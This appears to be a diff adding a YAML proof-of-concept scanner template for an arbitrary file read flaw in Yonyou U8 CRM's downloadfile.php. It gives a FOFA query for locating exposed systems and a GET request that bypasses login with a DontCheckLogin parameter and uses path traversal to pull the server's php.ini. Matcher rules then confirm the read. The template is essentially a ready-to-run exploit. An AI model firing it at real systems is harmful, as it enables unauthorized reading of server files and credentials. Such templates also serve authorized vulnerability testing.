@@ -1,0 +1,16 @@
+id: poc-yaml-yongyon-u8-crm-downloadfile-php-anyfile-read
+info:
+  name: 用友U8CRM downloadfile.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+requests:
+- method: GET
+  path: /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini
+  expression: "status_code == 200 && \ncontains(body,\"About php.ini\") &&\ncontains(body,\"\
+    About this file\") &&\ncontains(content_type,\"application/force-download\") &&\n\
+    contains(headers,\"filename=\")\n"
+variables: {}
+transport: http
